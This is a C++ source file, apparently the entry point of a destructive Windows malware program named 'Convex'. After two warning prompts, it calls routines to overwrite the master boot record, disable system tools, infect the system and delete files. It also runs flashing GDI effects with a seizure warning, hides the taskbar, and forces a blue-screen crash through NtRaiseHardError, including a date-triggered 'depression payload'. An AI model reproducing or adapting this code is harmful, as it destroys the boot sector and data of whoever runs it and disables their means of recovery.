#include "Convex.h"

VOID ExecuteDepressionPayload(VOID)
{
	MessageBoxW(NULL, L"Your computer has severe chronic depression and anxiety.", L"Depression Day", MB_ICONINFORMATION);
	CreateThread(NULL, 0, &January21::Grayscale, NULL, 0, NULL);
	Sleep(30 * 1000);
	BYTE UNUSED;
	DWORD UNUSED2;
	RtlAdjustPrivilege(19, TRUE, FALSE, &UNUSED);
	NtRaiseHardError(0xc000010b, 0, 0, NULL, 6, &UNUSED2);
}

INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpcCmdLine, INT nCmdShow) {
	if (GetFileAttributesW(L"C:\\winload.dat") == INVALID_FILE_ATTRIBUTES) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		if (MessageBoxW(NULL, L"Convex\n\nYou are running a malware, do you want to execute it?\nWarning 1/2", L"Convex", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES
		||
		MessageBoxW(NULL, L"Convex\n\nThis can damage your system and may cause you to have a seizure, do you still want to execute it?\nWarning 2/2", L"CKOVVNEX", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
	}
	if (Call::DateCheck(DATE_MONTH) == 1 && Call::DateCheck(DATE_DAY) == 21) {
		ExecuteDepressionPayload();
	}
	if (!Call::IfWindowsXP()) {
		MessageBoxW(NULL, L"Why? Just... why?\nYou are now greeted with the depression payload and your PC will crash after 30 seconds.", L"You are a masochist", MB_ICONQUESTION);
		ExecuteDepressionPayload();
	}
	DWORD thread;
	Call::ExecuteWatchdog();
	CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)&Call::SnapExeFile, NULL, 0, &thread);
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	Payloads::OverwriteMBR();
	Payloads::DisableSystemTools();
	Payloads::InfectSystem();
	Payloads::DeleteFiles();
	Sleep(7 * 1000);
	ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
	Bytebeat::Sound1();
	HANDLE hP1 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	HeapAlloc(hP1, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI1 = CreateThread(NULL, 0, &Shaders::RGBLines, hP1, 0, &thread);
	
	WaitForSingleObject(hGDI1, 30 * 1000);
	
	HeapFree(hP1, 0, NULL);
	EndHandle(hGDI1, hP1);
	waveOutReset(hwo);
	Redraw();
	
	Bytebeat::Sound2();
	HANDLE hP2 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0),
	hP2B = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	
	HeapAlloc(hP2, HEAP_ZERO_MEMORY, 512);
	HeapAlloc(hP2B, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI2 = CreateThread(NULL, 0, &Shaders::FractalsWithTint, hP2, 0, &thread);
	HANDLE hGDI2B = CreateThread(NULL, 0, &GDIEffects::HypnoticRotation, hP2B, 0, &thread);
	
	
	WaitForSingleObject(hGDI2B, 25 * 1000);
	
	HeapFree(hP2, 0, NULL);
	HeapFree(hP2B, 0, NULL);
	EndHandle(hGDI2, hP2); EndHandle(hGDI2B, hP2B);
	waveOutReset(hwo);
	Redraw();
	
	Sleep(100);
	
	Bytebeat::Sound3();
	HANDLE hP3 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	HeapAlloc(hP3, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI3 = CreateThread(NULL, 0, &Shaders::SierpinskiFade, hP3, 0, &thread);
	
	
	WaitForSingleObject(hGDI3, 20 * 1000);
	HeapFree(hP3, 0, NULL);
	EndHandle(hGDI3, hP3);
	waveOutReset(hwo);
	Redraw();
	
	Sleep(100);
	
	Bytebeat::Sound4();
	HANDLE hP4 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	HeapAlloc(hP4, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI4 = CreateThread(NULL, 0, &Shaders::FractalBlend, hP4, 0, &thread);
	
	
	WaitForSingleObject(hGDI4, 30 * 1000);
	HeapFree(hP4, 0, NULL);
	EndHandle(hGDI4, hP4);
	waveOutReset(hwo);
	Redraw();
	
	Sleep(1000);
	
	Bytebeat::Sound5();
	HANDLE hP5 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0),
	hP5B = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	
	HeapAlloc(hP5, HEAP_ZERO_MEMORY, 512);
	HeapAlloc(hP5B, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI5 = CreateThread(NULL, 0, &Shaders::GlitchCore, hP5, 0, &thread);
	HANDLE hGDI5B = CreateThread(NULL, 0, &GDIEffects::ParallelStretchBlur, hP5B, 0, &thread);
	
	
	WaitForSingleObject(hGDI5B, 25 * 1000);
	HeapFree(hP5, 0, NULL);
	HeapFree(hP5B, 0, NULL);
	EndHandle(hGDI5, hP5);
	EndHandle(hGDI5B, hP5B);
	waveOutReset(hwo);
	Redraw();
	
	Bytebeat::Sound6();
	HANDLE hP6 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	HeapAlloc(hP6, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI6 = CreateThread(NULL, 0, &Shaders::CirclesWithPatterns, hP6, 0, &thread);
	
	
	WaitForSingleObject(hGDI6, 20 * 1000);
	HeapFree(hP6, 0, NULL);
	EndHandle(hGDI6, hP6);
	waveOutReset(hwo);
	Redraw();
	
	Bytebeat::Sound7();
	HANDLE hP7 = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0),
	hP7B = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	
	HeapAlloc(hP7, HEAP_ZERO_MEMORY, 512);
	HeapAlloc(hP7B, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hGDI7 = CreateThread(NULL, 0, &Shaders::GlitchCore2, hP7, 0, &thread);
	HANDLE hGDI7B = CreateThread(NULL, 0, &GDIEffects::MadZooming, hP7B, 0, &thread);
	
	
	WaitForSingleObject(hGDI7B, 30 * 1000);
	
	
	HeapFree(hP7, 0, NULL);
	HeapFree(hP7B, 0, NULL);
	EndHandle(hGDI7, hP7); EndHandle(hGDI7B, hP7B);
	waveOutReset(hwo);
	Redraw();
	
	
	HANDLE hFINALMem = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
	HeapAlloc(hFINALMem, HEAP_ZERO_MEMORY, 512);
	
	HANDLE hFINAL = CreateThread(NULL, 0, &Shaders::Static, hFINALMem, 0, &thread);
	while (TRUE) {
		Bytebeat::Noise();
		Sleep(15 * 1000);
		waveOutReset(hwo);
	}
	
	ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_SHOWDEFAULT);
}
